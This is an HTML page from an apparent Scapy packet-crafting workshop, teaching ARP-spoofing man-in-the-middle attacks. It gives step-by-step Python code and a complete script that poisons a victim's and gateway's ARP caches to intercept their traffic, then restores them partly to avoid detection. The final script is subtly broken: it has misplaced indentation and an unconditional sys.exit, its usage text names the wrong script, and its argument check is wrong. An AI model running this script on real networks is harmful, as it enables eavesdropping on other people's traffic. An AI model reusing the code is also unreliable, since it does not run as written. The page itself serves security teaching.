<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="author" content="Bharath(yamakira_)">
  
  <title>ARP spoofing - The Art of Packet Crafting with Scapy!</title>
  

  <link rel="shortcut icon" href="../../img/favicon.ico">

  
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>

  <link rel="stylesheet" href="../../css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../css/theme_extra.css" type="text/css" />
  <link rel="stylesheet" href="../../css/highlight.css">

  
  <script>
    // Current page data
    var mkdocs_page_name = "ARP spoofing";
    var mkdocs_page_input_path = "network_attacks/arp_spoofing.md";
    var mkdocs_page_url = "/network_attacks/arp_spoofing/index.html";
  </script>
  
  <script src="../../js/jquery-2.1.1.min.js"></script>
  <script src="../../js/modernizr-2.8.3.min.js"></script>
  <script type="text/javascript" src="../../js/highlight.pack.js"></script>
  <script src="../../js/theme.js"></script> 

  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
      <div class="wy-side-nav-search">
        <a href="../../index.html" class="icon icon-home"> The Art of Packet Crafting with Scapy!</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
        <ul class="current">
          
            <li>
    <ul class="subnav">
    <li><span>Workshop intro</span></li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../index.html">The Art of Packet Crafting with Scapy</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../workshop_intro/license/index.html">License</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../workshop_intro/bigger_picture/index.html">Bigger picture</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../workshop_intro/speakers/index.html">Speakers</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../workshop_intro/workshop_settings/index.html">Workshop settings</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../workshop_intro/disclaimer/index.html">Disclaimer</a>
        
    </li>

        
    </ul>
<li>
          
            <li>
    <ul class="subnav">
    <li><span>Lab setup</span></li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../lab_setup/lab_setup/index.html">Mysterious boxes</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../lab_setup/network_hunt/index.html">Network Hunt</a>
        
    </li>

        
    </ul>
<li>
          
            <li>
    <ul class="subnav">
    <li><span>Networking</span></li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../networking/layers/index.html">Layers</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../networking/socket_interface/index.html">Socket Interface</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../networking/packet_headers/index.html">Packet Headers</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../networking/protocols/index.html">Protocols</a>
        
    </li>

        
    </ul>
<li>
          
            <li>
    <ul class="subnav">
    <li><span>Python</span></li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../python/python/index.html">Python</a>
        
    </li>

        
    </ul>
<li>
          
            <li>
    <ul class="subnav">
    <li><span>Scapy</span></li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../scapy/scapy_intro/index.html">Scapy Intro</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../scapy/scapy_modes/index.html">Scapy Modes</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../scapy/scapy_exploring/index.html">Exploring scapy</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../scapy/creating_packets/index.html">Creating packets</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../scapy/inspecting_packets/index.html">Inspecting packets</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../scapy/sending_recieving/index.html">Sending & Recieving</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../scapy/import_export/index.html">Import & Export data</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../scapy/sniffing/index.html">Sniffing</a>
        
    </li>

        
    </ul>
<li>
          
            <li>
    <ul class="subnav">
    <li><span>Network recon</span></li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../network_recon/host_discovery/index.html">Host discovery</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../network_recon/service_discovery/index.html">Service discovery</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../network_recon/os_detection/index.html">OS detection</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../network_recon/promisc/index.html">Promisc detection</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../network_recon/pcap_analysis/index.html">PCAP Analysis</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../network_recon/traceroute/index.html">Traceroute</a>
        
    </li>

        
    </ul>
<li>
          
            <li>
    <ul class="subnav">
    <li><span>Network attacks</span></li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../cam_overflow/index.html">CAM overflow</a>
        
    </li>

        
            
    <li class="toctree-l1 current">
        <a class="current" href="index.html">ARP spoofing</a>
        
            <ul>
            
                <li class="toctree-l3"><a href="#arp-spoofingmitm">ARP Spoofing(MiTM)</a></li>
                
            
            </ul>
        
    </li>

        
    </ul>
<li>
          
            <li>
    <ul class="subnav">
    <li><span>Misc libraries</span></li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../libraries/netaddr/index.html">netaddr</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../libraries/netifaces/index.html">netifaces</a>
        
    </li>

        
    </ul>
<li>
          
            <li>
    <ul class="subnav">
    <li><span>Exercises</span></li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../exercises/misc_exercises/index.html">Misc exercises</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../exercises/network_hunt/index.html">Network Hunt</a>
        
    </li>

        
    </ul>
<li>
          
            <li>
    <ul class="subnav">
    <li><span>Epilogue</span></li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../epilogue/moving_forward/index.html">Moving forward</a>
        
    </li>

        
            
    <li class="toctree-l1 ">
        <a class="" href="../../epilogue/feedback/index.html">Feedback</a>
        
    </li>

        
    </ul>
<li>
          
        </ul>
      </div>
      &nbsp;
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="../../index.html">The Art of Packet Crafting with Scapy!</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../../index.html">Docs</a> &raquo;</li>
    
      
        
          <li>Network attacks &raquo;</li>
        
      
    
    <li>ARP spoofing</li>
    <li class="wy-breadcrumbs-aside">
      
        
          <a href="https://github.com/yamakira/art-of-packet-crafting-with-scapy" class="icon icon-github"> Edit on GitHub</a>
        
      
    </li>
  </ul>
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="arp-spoofingmitm">ARP Spoofing(MiTM)</h1>
<div class="admonition caution">
<p class="admonition-title">Messing with ARP</p>
<ul>
<li>ARP attacks can potentially mess your LAN configuration. Be very cautious about testing these attacks/scripts in production environment(or in any network for that matter)</li>
<li>Fortunately any potential mis-configuration will be corrected to orignal state in few minutes. If you do happen to mess up your LAN, take a walk, come back several minutes later, pretend that the network was still working when you left. </li>
</ul>
</div>
<ul>
<li>In common hub networks all traffic can be seen by all hosts whose NICs (network interface card) are in promiscuous mode, but things are a bit different on switched networks.</li>
<li>A switch looks at the data sent to it and tries to only forward packets to its intended recipient based on the MAC address.</li>
<li>Switched networks are more secure and help speed up the network by only sending packets where they need to go.</li>
<li>There are ways around switches though. Using a program like Arpspoof (part of the Dsniff package), we can lie to other machines on the local area network and tell them we have the IP they are looking for, thus funneling their traffic through us.</li>
</ul>
<p align="center">
<img align="center" src="../../img/mitm.png" alt="ARP spoofing">
</p>

<ul>
<li>In the above image, the attacker is telling Alan&rsquo;s box that he has the IP that corresponds to Brian&rsquo;s box and vice versa. By doing this the attacker receives all network traffic going between Alan and Brian. Once the attacker has ARP Spoofed his way between two nodes he can sniff the connection. By ARP Spoofing between a computer and the LAN&rsquo;s gateway an attacker can see all the traffic the computer is sending out and receiving.</li>
</ul>
<p><strong>Step I- IP forwarding</strong></p>
<ul>
<li>Make sure that the kernel IP forwarding is enabled, otherwise our machine will drop all traffic between the hosts we are trying to sniff, causing a denial of service.(&ldquo;IP forwarding&rdquo; is a synonym for &ldquo;routing.&rdquo; It is called &ldquo;kernel IP forwarding&rdquo; because it is a feature of the Linux kernel.)</li>
</ul>
<pre><code class="python">&gt;&gt;&gt; import os
&gt;&gt;&gt; os.system('echo 1 &gt; /proc/sys/net/ipv4/ip_forward')           # enable kernel IP forwarding
&gt;&gt;&gt; os.system('echo 0 &gt; /proc/sys/net/ipv4/ip_forward')           # disable kernel IP forwarding
</code></pre>

<p>More on kernel IP forwarding: <a href="http://unix.stackexchange.com/questions/14056/what-is-kernel-ip-forwarding">What is kernel IP forwarding?</a></p>
<p><strong>Step II - Gather MAC addresses</strong></p>
<p>In order to create our ARP responses, we&rsquo;ll need the victim and router MAC addresses. We can do this by making ARP requests and returning the result.</p>
<pre><code class="python">def get_mac(IP):
    ans, unans = srp(Ether(dst = &quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r&quot;%Ether.src%&quot;)
</code></pre>

<p><strong>Step III - Tricking the Targets</strong></p>
<p>In this step we are tricking eachmachine into thinking that the other party is our machine. 
ARP reply to each of the targets telling them that we are the other target, placing ourselves in between them.</p>
<pre><code class="python">def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))
</code></pre>

<p><strong>Step III - Un-doing the attack/ Re-ARPing</strong></p>
<p>It&rsquo;s not enough to trick the machines, once our attack is over, we need to re-assign the target&rsquo;s addresses so they know where to send their information properly. If we don&rsquo;t do this than it will be very obvious that something has happened.</p>
<pre><code class="python">def reARP():
    print &quot;\n[*] Restoring Targets...&quot;
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_mac(gatewayIP)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = gatewayMAC), count = 7)
        disable_ip_forwarding()
    print &quot;[*] Shutting Down...&quot;
    sys.exit(1)
</code></pre>

<p><strong>Final script</strong></p>
<pre><code class="python">from scapy.all import *
import sys
import os
import time


def help_text():
    print(&quot;\nUsage:\n python hd_tcp_syn.py network_range\n&quot;)
    sys.exit()

def enable_ip_forwarding():
    print &quot;\n[*] Enabling IP Forwarding...\n&quot;
    os.system(&quot;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&quot;)

def disable_ip_forwarding():
    print &quot;[*] Disabling IP Forwarding...&quot;
    os.system(&quot;echo 0 &gt; /proc/sys/net/ipv4/ip_forward&quot;)

def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = &quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r&quot;%Ether.src%&quot;)

def reARP():

    print &quot;\n[*] Restoring Targets...&quot;
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_mac(gatewayIP)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = gatewayMAC), count = 7)
    disable_ip_forwarding()
    print &quot;[*] Shutting Down...&quot;
    sys.exit(1)

def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))

def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        disable_ip_forwarding()
        print &quot;[!] Couldn't Find Victim MAC Address&quot;
        print &quot;[!] Exiting...&quot;
    sys.exit(1)
    try:
        gatewayMAC = get_mac(gatewayIP)
    except Exception:
        disable_ip_forwarding()
        print &quot;[!] Couldn't Find Gateway MAC Address&quot;
    print &quot;[!] Exiting...&quot;
        sys.exit(1)
    print &quot;[*] Poisoning Targets...&quot;    
    while 1:
    try:
        trick(gatewayMAC, victimMAC)
            time.sleep(1.5)
    except KeyboardInterrupt:
        reARP()
        break

if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        help_text()
    interface = sys.argv[1]
    victimIP = sys.argv[2]
    gatewayIP = sys.argv[3] 
    enable_ip_forwarding()
    mitm()
</code></pre>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../../libraries/netaddr/index.html" class="btn btn-neutral float-right" title="netaddr">Next <span class="icon icon-circle-arrow-right"></span></a>
      
      
        <a href="../cam_overflow/index.html" class="btn btn-neutral" title="CAM overflow"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
	  
        </div>
      </div>

    </section>

  </div>

<div class="rst-versions" role="note" style="cursor: pointer">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
          <a href="https://github.com/yamakira/art-of-packet-crafting-with-scapy" class="icon icon-github" style="float: left; color: #fcfcfc"> GitHub</a>
      
      
        <span><a href="../cam_overflow/index.html" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
        <span style="margin-left: 15px"><a href="../../libraries/netaddr/index.html" style="color: #fcfcfc">Next &raquo;</a></span>
      
    </span>
</div>

</body>
</html>
